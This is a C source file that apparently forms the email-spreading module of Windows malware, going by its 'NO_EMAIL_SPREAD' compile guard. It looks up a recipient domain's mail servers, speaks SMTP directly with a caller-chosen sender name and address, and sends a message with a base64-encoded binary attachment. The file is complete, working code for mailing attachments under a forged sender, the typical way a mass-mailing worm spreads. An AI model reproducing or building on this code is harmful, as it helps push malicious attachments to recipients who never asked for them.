#include <winsock2.h>
#include "smtp.h"

#ifndef NO_EMAIL_SPREAD

CHAR Base64Ret[4];

PCHAR Base64Enc3(CHAR Bytes[3], UINT Used){
	const BYTE Table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
	Base64Ret[0] = Table[(Bytes[0] >> 2) & 0x3F];
	Base64Ret[1] = Table[Used < 1 ? 64 : ((Bytes[0] << 4) & 0x3F) | ((Bytes[1] >> 4) & 0xF)];
	Base64Ret[2] = Table[Used < 2 ? 64 : ((Bytes[1] << 2) & 0x3F) | ((Bytes[2] >> 6) & 0x3)];
	Base64Ret[3] = Table[Used <= 2 ? 64 : Bytes[2] & 0x3F];
	return Base64Ret;
}

UINT SendSMTP(PCHAR To, PCHAR From, PCHAR FromName, PCHAR Subject, PCHAR Message, PCHAR Attachment, UINT AttachmentSize, PCHAR AttachmentName){
	UINT Success = 1;
	DNSResolver DNSResolver;
	PCHAR Host = strchr(To, '@');
	if(!Host)
		return 0;
	Host += 1;
	#ifdef _DEBUG
	dprintf("Sending to %s\r\n", To);
	dprintf("mail host = %s\r\n", Host);
	#endif
	DNSResolver.Query(Host, DNS_TYPE_MX);
	ResourceRecord* TempRecord = DNSResolver.Answer;
	#ifdef _DEBUG
	dprintf("\r\nMail Servers:\r\n");
	#endif
	if(!TempRecord)
		return 0;
	while(TempRecord){
		if(TempRecord->Type == DNS_TYPE_MX){
			UINT Size;
			PCHAR MailServer = DNSResolver.DecodeDomainName(&TempRecord->Data[2], &Size);
			#ifdef _DEBUG
			dprintf("    %d %s\r\n", ntohs(*(USHORT*)TempRecord->Data), MailServer);
			#endif

			Socket Socket;
			Socket.Create(SOCK_STREAM);
			ReceiveBuffer RecvBuf;
			RecvBuf.Create(1024);
			enum State{SMTP_GET_PREAMBLE, SMTP_GET_HELO_OK, SMTP_GET_FROM_OK, SMTP_GET_TO_OK, SMTP_GET_DATA_OK, SMTP_GET_DATA_SENT_OK} State = SMTP_GET_PREAMBLE;
			if(Socket.Connect(MailServer, 25) == 0){
				#ifdef _DEBUG
				dprintf("Connected\r\n");
				#endif
				Socket.EventSelect(FD_READ | FD_CLOSE);
				WSAEVENT hEvent = Socket.GetEventHandle();
				WSANETWORKEVENTS NetEvents;
				Timeout Timeout;
				Timeout.SetTimeout(5000);
				Timeout.Reset();
				while(1){
					if(Timeout.TimedOut()){
						goto end;
					}
					if(WSAWaitForMultipleEvents(1, &hEvent, FALSE, 2000, FALSE) != WSA_WAIT_TIMEOUT){
						Socket.EnumEvents(&NetEvents);
						if(NetEvents.lNetworkEvents & FD_READ){
							if(RecvBuf.Read(Socket) > 0){
								while(RecvBuf.PopItem("\r\n", 2)){
									if(State == SMTP_GET_PREAMBLE){
										if(strncmp(RecvBuf.PoppedItem, "220 ", 4) == 0){
											#ifdef _DEBUG
											dprintf("HEADER RECEIVED (%s)\r\n", RecvBuf.PoppedItem);
											#endif
											Socket.Sendf("HELO %s\r\n", Host);
											State = SMTP_GET_HELO_OK;
										}else
											goto end;
									}else
									if(State == SMTP_GET_HELO_OK){
										if(strncmp(RecvBuf.PoppedItem, "250 ", 4) == 0){
											#ifdef _DEBUG
											dprintf("HELO OK (%s)\r\n", RecvBuf.PoppedItem);
											#endif
											Socket.Sendf("MAIL FROM:<%s>\r\n", From);
											State = SMTP_GET_FROM_OK;
										}else
											goto end;
									}else
									if(State == SMTP_GET_FROM_OK){
										#ifdef _DEBUG
										dprintf("%s\r\n", RecvBuf.PoppedItem);
										#endif
										if(strncmp(RecvBuf.PoppedItem, "250 ", 4) == 0){
											#ifdef _DEBUG
											dprintf("FROM OK (%s)\r\n", RecvBuf.PoppedItem);
											#endif
											Socket.Sendf("RCPT TO:<%s>\r\n", To);
											State = SMTP_GET_TO_OK;
										}else
											goto end;
									}else
									if(State == SMTP_GET_TO_OK){
										#ifdef _DEBUG
										dprintf("%s\r\n", RecvBuf.PoppedItem);
										#endif
										if(strncmp(RecvBuf.PoppedItem, "250 ", 4) == 0){
											#ifdef _DEBUG
											dprintf("TO OK (%s)\r\n", RecvBuf.PoppedItem);
											#endif
											Socket.Sendf("DATA\r\n");
											State = SMTP_GET_DATA_OK;
										}else
											goto end;
									}else
									if(State == SMTP_GET_DATA_OK){
										if(strncmp(RecvBuf.PoppedItem, "354 ", 4) == 0){
											#ifdef _DEBUG
											dprintf("DATA OK (%s)\r\n", RecvBuf.PoppedItem);
											#endif
											CHAR Boundary[70];
											for(UINT i = 0; i < sizeof(Boundary); i++)
												Boundary[i] = rand_r(0, 1) ? rand_r('a', 'f') : rand_r('0', '9');
											Boundary[rand_r(20, 68)] = 0;

											Socket.Sendf("From: %s <%s>\r\n", FromName, From);
											Socket.Sendf("Subject: %s\r\n", Subject);
											Socket.Sendf("Mime-Version: 1.0\r\n");
											Socket.Sendf("Content-Type: multipart/mixed; boundary=\"%s\"\r\n\r\n", Boundary);
											Socket.Sendf("--%s\r\n", Boundary);
											Socket.Sendf("Content-Type: text/plain\r\n\r\n");
											Socket.Sendf("%s\r\n\r\n", Message);
											if(Attachment){
												Socket.Sendf("--%s\r\n", Boundary);
												Socket.Sendf("Content-Type: application/octet-stream; name=\"%s\";\r\nContent-Transfer-Encoding: base64\r\n\r\n", AttachmentName);
												for(UINT i = 0; i < AttachmentSize; i += 3){
													Socket.Send(Base64Enc3(Attachment + i, (i + 3) >= AttachmentSize ? AttachmentSize % 3 : 3), 4); // cpu intensive
												}
											}
											Socket.Sendf("\r\n\r\n--%s--\r\n\r\n", Boundary);
											Socket.Sendf("\r\n.\r\n");

											State = SMTP_GET_DATA_SENT_OK;
										}else
											goto end;
									}else
									if(State == SMTP_GET_DATA_SENT_OK){
										#ifdef _DEBUG
										dprintf("%s\r\n", RecvBuf.PoppedItem);
										#endif
										if(strncmp(RecvBuf.PoppedItem, "250 ", 4) == 0){
											#ifdef _DEBUG
											dprintf("DATA SENT (%s)\r\n", RecvBuf.PoppedItem);
											#endif
											Success = 2;
											goto end;
										}else
											goto end;
									}
								}
							}
						}
						if(NULL){
							end:
							;
							Socket.EventSelect(FD_CLOSE);
							Socket.Shutdown();
						}
						if(NetEvents.lNetworkEvents & FD_CLOSE){
							#ifdef _DEBUG
							dprintf("Connection closed\r\n");
							#endif
							TempRecord = NULL;
							RecvBuf.Cleanup();
							Socket.Disconnect(CLOSE_BOTH_HDL);
							break;
						}
					}
				}
			}
		}
		if(TempRecord)
			TempRecord = TempRecord->Next;
	}
	return Success;
}

#endif